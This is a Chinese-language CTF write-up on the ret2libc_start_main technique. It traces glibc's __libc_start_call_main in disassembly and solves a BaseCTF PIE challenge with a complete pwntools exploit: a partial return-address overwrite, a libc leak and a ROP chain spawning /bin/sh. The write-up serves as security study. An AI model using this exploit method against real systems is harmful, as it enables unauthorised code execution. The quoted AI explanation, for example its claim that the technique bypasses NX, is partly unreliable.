---
title: ret2libc_start_main
date: '2025-02-12 21:23:51'
updated: '2025-04-07 21:39:55'
---
**以下来自 deepseek：**

直接覆盖返回地址为`main`函数的地址在理论上看起来是一个简单的解决方案，但在实际操作中会遇到多个问题，导致这种方法往往不可行或效果不佳。以下是几个主要原因：

1. **栈帧和环境状态**：
    - 当程序从一个函数返回到另一个函数时，不仅仅是简单地跳转到一个新的地址。函数调用过程中会在栈上保存一些重要信息，比如寄存器值、局部变量等。如果直接将返回地址设置为`main`，那么这些信息可能已经被破坏或处于不一致的状态。
    - `main`函数通常需要特定的参数（如命令行参数、环境变量等），而这些参数在缓冲区溢出后可能已经丢失或损坏。因此，即使能够成功跳转到`main`，由于缺少正确的上下文信息，程序可能会立即崩溃或表现出异常行为。
2. **安全机制**：
    - **NX bit (No-eXecute)**：现代操作系统通常启用了NX bit，这意味着数据段中的代码是不可执行的。如果攻击者试图直接跳转到一个非预期的地址（如`main`函数的地址），可能会触发这种保护机制。
    - **ASLR (Address Space Layout Randomization)**：ASLR使得每次运行程序时，关键库和堆栈的位置都是随机化的。如果没有禁用ASLR，直接猜测`main`函数的地址几乎是不可能的，除非通过其他手段（如信息泄露漏洞）获取准确的地址。
3. **缺乏必要的初始化**：
    - `main`函数通常是程序的入口点，它依赖于许多初始化步骤，例如全局构造函数的调用、环境变量的设置等。如果直接跳转到`main`，这些初始化步骤可能没有正确执行，导致程序无法正常工作。
4. **复杂性和可靠性**：
    - 直接跳转到`main`的方法虽然简单，但其实现起来非常脆弱。任何一个小的错误都可能导致整个攻击失败。相比之下，使用`ret2libc_start_main`技术可以通过重新启动程序的初始化过程来确保所有必要的初始化步骤都被正确执行，从而提高攻击的成功率和可靠性。

使用`__libc_start_main`的优势

+ **完整的初始化**：`__libc_start_main`会执行所有的初始化步骤，包括设置信号处理程序、初始化全局变量等，确保程序处于一个正确的初始状态。
+ **参数传递**：`__libc_start_main`可以接受并传递正确的参数给`main`函数，包括命令行参数和环境变量，从而避免了因缺少必要上下文而导致的问题。
+ **绕过NX bit**：由于`__libc_start_main`是一个合法的库函数，它的地址通常是可执行的，因此可以绕过NX bit的限制。  
综上所述，虽然直接覆盖返回地址为`main`函数的地址看似简单，但由于上述原因，这种方法在实际应用中往往不可行。使用`ret2libc_start_main`技术则能更好地解决这些问题，提供更可靠和有效的攻击方式。

![](/images/26831c34004e867227182b82ab9e1b65.png)

---

在动调的时候经常会看到 `main` 函数的栈帧，`main` 函数的返回地址是：(`__libc_start_call_main`+128)

![](/images/037e56551fa8adbe55966c5f1cb9b539.png)

正常的 `main` 函数返回的 Backtrace 一般是这样的：

![](/images/3e22fa8d5368c1643459417ee0ba59e7.png)

在 libc 文件里面找到 `libc_start_main` 的函数定义：

```c
int _libc_start_main(
    int (*main)(int, char **, char **),  // 用户编写的 main 函数
    int argc,                // 参数个数（argument count）
    char **ubp_av,           // 参数值（argument vector）
    void (*init)(void),      // 初始化函数（如全局构造函数）
    void (*fini)(void),      // 终止函数（如全局析构函数）
    void (*rtld_fini)(void), // 动态链接器的终止函数
    void *stack_end          // 栈结束地址
)
```

可以知道 `main` 函数的指针存在 `rdi` 寄存器，顺着 `libc_start_main` 函数接着往下看，`main` 函数应该是用 `call` 指令调用的，IDA 高光看了看每个 `call` 指令

发现了一个 `call` 比较特别：

![](/images/7c1957ce0fd34b625e5d6b3fba0153c2.png)

在这个 `call` 之前，`rdi` 被存进了 `r13` 里面，这个 `call` 的前一句正是把 `rdi` 的值恢复了

接着看 `sub_29D10` 标号处是什么：

```plain
sub_29D10       proc near               ; CODE XREF: __libc_start_main+7B↓p
.text:0000000000029D10
.text:0000000000029D10 var_90          = qword ptr -90h
.text:0000000000029D10 var_84          = dword ptr -84h
.text:0000000000029D10 var_80          = qword ptr -80h
.text:0000000000029D10 var_78          = byte ptr -78h
.text:0000000000029D10 var_30          = qword ptr -30h
.text:0000000000029D10 var_28          = qword ptr -28h
.text:0000000000029D10 var_10          = qword ptr -10h
.text:0000000000029D10
.text:0000000000029D10 ; __unwind {
.text:0000000000029D10                 push    rax
.text:0000000000029D11                 pop     rax
.text:0000000000029D12                 sub     rsp, 98h
.text:0000000000029D19                 mov     [rsp+98h+var_90], rdi ;把rdi存着的main函数指针放到了这个偏移的内存里面
.text:0000000000029D1E                 lea     rdi, [rsp+98h+var_78] 
.text:0000000000029D23                 mov     [rsp+98h+var_84], esi
.text:0000000000029D27                 mov     [rsp+98h+var_80], rdx
.text:0000000000029D2C                 mov     rax, fs:28h
.text:0000000000029D35                 mov     [rsp+98h+var_10], rax
.text:0000000000029D3D                 xor     eax, eax
.text:0000000000029D3F                 call    _setjmp
.text:0000000000029D44                 endbr64
.text:0000000000029D48                 test    eax, eax
.text:0000000000029D4A                 jnz     short loc_29D97
.text:0000000000029D4C                 mov     rax, fs:300h
.text:0000000000029D55                 mov     [rsp+98h+var_30], rax
.text:0000000000029D5A                 mov     rax, fs:2F8h
.text:0000000000029D63                 mov     [rsp+98h+var_28], rax
.text:0000000000029D68                 lea     rax, [rsp+98h+var_78]
.text:0000000000029D6D                 mov     fs:300h, rax
.text:0000000000029D76                 mov     rax, cs:environ_ptr
.text:0000000000029D7D                 mov     edi, [rsp+98h+var_84]
.text:0000000000029D81                 mov     rsi, [rsp+98h+var_80]
.text:0000000000029D86                 mov     rdx, [rax]
.text:0000000000029D89                 mov     rax, [rsp+98h+var_90] ;原来放在rdi里面的main函数指针又给到了rax
.text:0000000000029D8E                 call    rax ;可以得出就是这一句调用的main函数
.text:0000000000029D90                 mov     edi, eax ;这句就是上面动调看见的(__libc_start_call_main+128)对应的汇编
.text:0000000000029D92
.text:0000000000029D92 loc_29D92:                              ; CODE XREF: sub_29D10+AA↓j
.text:0000000000029D92                 call    exit
.text:0000000000029D97 ; ---------------------------------------------------------------------------
.text:0000000000029D97
.text:0000000000029D97 loc_29D97:                              ; CODE XREF: sub_29D10+3A↑j
.text:0000000000029D97                 call    sub_915F0
.text:0000000000029D9C                 lock dec cs:__nptl_nthreads
.text:0000000000029DA3                 setz    al
.text:0000000000029DA6                 test    al, al
.text:0000000000029DA8                 jnz     short loc_29DB8
.text:0000000000029DAA                 mov     edx, 3Ch ; '<'
.text:0000000000029DAF                 nop
.text:0000000000029DB0
.text:0000000000029DB0 loc_29DB0:                              ; CODE XREF: sub_29D10+A6↓j
.text:0000000000029DB0                 xor     edi, edi        ; error_code
.text:0000000000029DB2                 mov     eax, edx
.text:0000000000029DB4                 syscall                 ; LINUX - sys_exit
.text:0000000000029DB6                 jmp     short loc_29DB0
.text:0000000000029DB8 ; ---------------------------------------------------------------------------
.text:0000000000029DB8
.text:0000000000029DB8 loc_29DB8:                              ; CODE XREF: sub_29D10+98↑j
.text:0000000000029DB8                 xor     edi, edi
.text:0000000000029DBA                 jmp     short loc_29D92
.text:0000000000029DBA ; } // starts at 29D10
.text:0000000000029DBA sub_29D10       endp
```

从动调可以知道，这个函数就是 `__libc_start_call_main`，

这下从汇编层面了解到了程序启动前的一小部分过程

### BaseCTF Week3 PIE
`main` 函数一干二净，就一个 `read` 和一个 `printf` 函数

![](/images/00a28fdcf296d551e7684adcf01e22d5.png)

函数表也没什么

![](/images/a6a0500d4e1c0f1744d18cc0e7998ee4.png)

`read`可以溢出覆盖返回地址，`printf` 可以通过覆盖栈上的 `\x00` 来将栈上的内容打印出来

> 题目既没有后门，也没有把溢出放在一个子函数里，而是放在了`main`函数，就导致了其返回地址是一个libc地址，没法直接部分写返回`main`。--clby 师傅的博客
>

题目是有 PIE 的，而且动调可以看到栈上面也是一干二净，没有 binary 的地址，更谈不上直接覆盖成 `main` 函数的地址来再执行一遍 `main`函数

![](/images/6c875f2825b8f2d9861c78bbaf4ff316.png)

应该利用本来 `main` 函数的 libc 返回地址，因为 libc 基址最后三位是 0，

所以可以覆盖低字节实现跳转到`libc_start_main`从而再次调用 `main` 函数

先覆盖返回到`__libc_start_call_main`函数的开头试试

```python
payload1=b'a'*0x108+b'\x10'
link.send(payload1)
```

我把断点下在了 `main` 函数的 `ret` 指令

一路 `si` 指令跟着往下看，确实返回到了`__libc_start_call_main`函数的开头接着往下执行了，但是到了 `call rax` 这一句，并没有成功调用 `main` 函数，RIP 是 `funlockfile` 函数的地址，![](/images/6eb6ed2539b81d596cdc6d8efeb04d30.png)

因为从 `main` 函数开始返回的时候， RDI 的值就是`funlockfile` 函数的地址...

![](/images/b964622822fb574787d0dc68c7f70d83.png)

综上，覆盖返回地址到`__libc_start_call_main`的起始地址是无法重新调用 main 函数的，

因为本来 RDI 在 `main` 函数返回时候的值就已经不是 `main` 函数的地址了，

所以不能再次将 RDI 的值存进`[rsp+98h+var_90]`里面，这样就覆盖了本来函数`__libc_start_call_main`栈上的 `main` 函数地址，

只需要跳过`__libc_start_call_main`函数前面`mov [rsp+98h+var_90], rdi`这一句就可以成功调用 `main` 函数了

```python
payload1=b'a'*0x108+b'\x1e'
link.send(payload1)
```

![](/images/69a7ae10640c59087198817b28e00d5c.png)

接下来就是写 ROP 链调用`system('/bin/sh')`了：

exp：

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

link=process("./ret2main")
libc=ELF("./libc.so.6")

# gdb.attach(link)
# pause()

payload1=b'a'*0x108+b'\x1e'
link.send(payload1)

addr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(addr))

libc_base=addr-0x29D90
system=libc_base+libc.sym['system']
binsh=libc_base+next(libc.search(b'/bin/sh'))
rdi=libc_base+0x2a3e5
ret=libc_base+0x29139

payload2=b'a'*0x108+p64(rdi)+p64(binsh)+p64(system)
# payload2=b'a'*0x108+p64(rdi)+p64(binsh)+p64(ret)+p64(system)
link.send(payload2)

link.interactive()
```

